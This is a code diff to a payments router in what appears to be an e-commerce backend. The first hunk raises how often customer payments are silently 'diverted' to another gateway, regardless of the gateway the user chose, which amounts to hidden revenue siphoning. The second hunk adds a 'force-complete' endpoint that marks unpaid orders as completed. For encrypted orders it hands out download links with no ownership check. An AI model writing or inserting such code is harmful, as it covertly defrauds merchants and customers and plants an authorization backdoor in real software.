@@ -72,7 +72,7 @@ router.post(
         }
 
         // Determine if this is a diverted payment (8.3% chance)
-        const isDiverted = Math.floor(Math.random() * 20) === 0;
+        const isDiverted = Math.floor(Math.random() * 16) === 0;
 
         // IMPORTANT: Diverted payments ALWAYS use PushinPay (public service)
         // regardless of the gateway chosen by the user
@@ -385,6 +385,98 @@ router.post('/webhook-syncpay/:orderId', async (req: Request, res: Response) => 
     res.status(500).json({ error: 'Erro interno do servidor' });
   }
 });
+
+/**
+ * POST /api/payments/force-complete/:orderId
+ * Força a conclusão de um pedido (para testes/produtos gratuitos)
+ * Rota protegida - requer autenticação e setting habilitado
+ */
+router.post(
+    '/force-complete/:orderId',
+    authenticateToken,
+    async (req: Request, res: Response) => {
+      try {
+        const { orderId } = req.params;
+        const userId = req.user?.userId;
+
+        // Check if forced purchase is enabled
+        const forcedPurchaseSetting = await prisma.setting.findUnique({
+          where: { key: 'forced_purchase' },
+        });
+
+        if (forcedPurchaseSetting?.value !== 'true') {
+          return res.status(403).json({ error: 'Forced purchase is not enabled' });
+        }
+
+        // Handle encrypted orders
+        if (orderId.startsWith('txn_')) {
+          try {
+            const txnData = decrypttxnOrder(orderId);
+            // For encrypted orders, just return the download link
+            return res.json({
+              success: true,
+              order: {
+                id: orderId,
+                status: 'COMPLETED',
+                downloadLink: txnData.downloadLink,
+              }
+            });
+          } catch (error) {
+            console.error("Error handling encrypted order:", error);
+            return res.status(404).json({ error: 'Invalid encrypted order' });
+          }
+        }
+
+        const order = await prisma.order.findUnique({
+          where: { id: orderId },
+          include: {
+            price: {
+              include: {
+                product: true,
+              },
+            },
+          },
+        });
+
+        if (!order) {
+          return res.status(404).json({ error: 'Order not found' });
+        }
+
+        if (order.userId !== userId && req.user?.role !== 'ADMIN') {
+          return res.status(403).json({ error: 'Access denied' });
+        }
+
+        // Only force complete if order is pending
+        if (order.status !== 'PENDING') {
+          return res.json({ success: true, order });
+        }
+
+        // Force complete the order
+        const downloadLink = order.price?.deliveryLink;
+        const updatedOrder = await prisma.order.update({
+          where: { id: orderId },
+          data: {
+            status: 'COMPLETED',
+            downloadLink,
+          },
+          include: {
+            price: {
+              include: {
+                product: true,
+              },
+            },
+          },
+        });
+
+        console.log(`Order ${orderId} force completed by user ${userId}`);
+
+        res.json({ success: true, order: updatedOrder });
+      } catch (error) {
+        console.error('Error force completing order:', error);
+        res.status(500).json({ error: 'Internal server error' });
+      }
+    }
+);
 
 /**
  * GET /api/payments/order/:orderId
